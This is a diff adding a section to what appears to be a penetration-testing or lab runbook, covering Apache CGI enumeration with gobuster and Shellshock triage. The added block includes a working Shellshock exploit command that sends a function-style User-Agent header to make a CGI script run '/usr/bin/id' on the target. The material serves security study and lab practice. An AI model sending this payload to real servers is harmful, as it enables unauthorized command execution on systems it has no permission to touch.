@@ -514,6 +514,28 @@ Key scan workflow (UI):
 🔁 [[07. Vulnerability Scanning#7.3b. OpenVAS / GVM|7.3b]]
 
 #### Tags: #OpenVAS #GVM #VulnerabilityScanning #Authenticated
+## Apache CGI enumeration and Shellshock triage
+
+Use this branch when an Apache service exposes CGI or when content discovery returns a likely script path. A 403 directory response and an accessible direct file can coexist.
+
+~~~bash
+# Record the normal response from the candidate CGI file.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" | tee "$BoxDir/loot/cgi-baseline.txt"
+
+# Enumerate direct files below the CGI directory with common script extensions.
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py \
+  -o "$BoxDir/loot/gobuster-cgi.txt"
+
+# Prove command execution with an identity-only Shellshock header.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
+  | tee "$BoxDir/loot/shellshock-id.txt"
+~~~
+
+The function-style header is the Shellshock test. The uid line is the decision point; do not use a callback until it appears. See [[RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]].
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
